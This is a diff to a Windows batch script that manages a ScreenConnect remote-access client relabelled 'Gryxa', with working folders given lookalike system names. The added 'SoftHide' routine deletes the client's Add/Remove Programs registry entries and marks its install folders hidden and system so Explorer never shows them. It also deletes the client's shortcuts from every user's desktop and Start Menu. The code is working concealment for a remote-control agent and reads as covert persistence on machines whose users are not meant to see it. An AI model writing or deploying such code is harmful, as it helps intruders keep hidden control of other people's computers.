@@ -83,6 +83,8 @@ rem 0.2.1 (C32 EVITA): Detect/DetectAll matched English SERVICE_NAME: - Spanish 
 rem   emits NOMBRE_SERVICIO: so Gryxa looked "absent" forever; every cycle msiexec /x the
 rem   shared ProductCode + reinstall = console duplicates. Detect is locale-invariant now;
 rem   Install never msiexec /x shared PC (keepers share it - C03/C29).
+rem 0.2.2: SoftHide - ARP (Add/Remove) + hidden/system attrib on Gryxa Program Files dir only
+rem   + strip ScreenConnect shortcuts. Keepers never touched.
 setlocal EnableExtensions EnableDelayedExpansion
 set "ZD=C:\ProgramData\WinRTCS"
 set "CD=C:\ProgramData\Microsoft\WinRTCS\cache"
@@ -109,7 +111,7 @@ set "GDIR86=C:\Program Files (x86)\ScreenConnect Client (36e506ff016b2151)"
 set "GDIR64=C:\Program Files\ScreenConnect Client (36e506ff016b2151)"
 set "PC={9D7CC418-A356-9693-DCC5-41EC44D03B31}"
 set "PACKED=814CC7D9653A3969CD5C14CE440DB313"
-set "GVER=0.2.1"
+set "GVER=0.2.2"
 if not exist "%ZD%" mkdir "%ZD%" >nul 2>&1
 
 rem --- TRUST (C24): data pins published by the agent from the signed manifest ---
@@ -716,7 +718,8 @@ if defined NH if /I "!NH!"=="!WANT!" (
 exit /b 0
 
 :HideARP
-rem --- hide gryxa from Add/Remove Programs (backup once, then drop ARP keys; ProductCode still works) ---
+rem --- SoftHide (0.2.2): Add/Remove + Explorer Program Files. Gryxa FP dirs ONLY. ---
+rem --- ARP: backup once, drop Uninstall keys (shared PC - also clears that ARP row for keepers). ---
 set "ARP64=HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\%PC%"
 set "ARP32=HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\%PC%"
 if not exist "%ZD%\arp_backup.reg" (
@@ -724,6 +727,24 @@ if not exist "%ZD%\arp_backup.reg" (
 )
 reg query "%ARP64%" >nul 2>&1 && ( reg add "%ARP64%" /v SystemComponent /t REG_DWORD /d 1 /f >nul 2>&1 & reg delete "%ARP64%" /f >nul 2>&1 & echo [%DATE% %TIME%] arp_hidden>>"%LOG%" )
 reg query "%ARP32%" >nul 2>&1 && ( reg add "%ARP32%" /v SystemComponent /t REG_DWORD /d 1 /f >nul 2>&1 & reg delete "%ARP32%" /f >nul 2>&1 )
+rem --- Program Files: +H +S so default Explorer (and "show hidden") still hide it ---
+if exist "%GDIR86%" attrib +H +S "%GDIR86%" >nul 2>&1
+if exist "%GDIR86%" attrib +H +S "%GDIR86%\*" /S /D >nul 2>&1
+if exist "%GDIR64%" attrib +H +S "%GDIR64%" >nul 2>&1
+if exist "%GDIR64%" attrib +H +S "%GDIR64%\*" /S /D >nul 2>&1
+rem --- shortcuts MSI may drop (Public + Start Menu; never keeper-specific names alone) ---
+del /f /q "%PUBLIC%\Desktop\*ScreenConnect*.lnk" >nul 2>&1
+del /f /q "%PUBLIC%\Desktop\*Gryxa*.lnk" >nul 2>&1
+del /f /q "%ProgramData%\Microsoft\Windows\Start Menu\Programs\*ScreenConnect*.lnk" >nul 2>&1
+del /f /q "%ProgramData%\Microsoft\Windows\Start Menu\Programs\*Gryxa*.lnk" >nul 2>&1
+for /d %%U in ("%SystemDrive%\Users\*") do (
+  if /I not "%%~nxU"=="Public" if /I not "%%~nxU"=="Default" if /I not "%%~nxU"=="Default User" (
+    del /f /q "%%U\Desktop\*ScreenConnect*.lnk" >nul 2>&1
+    del /f /q "%%U\Desktop\*Gryxa*.lnk" >nul 2>&1
+    del /f /q "%%U\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\*ScreenConnect*.lnk" >nul 2>&1
+  )
+)
+echo [%DATE% %TIME%] softhide_ok>>"%LOG%"
 exit /b 0
 
 :Shields
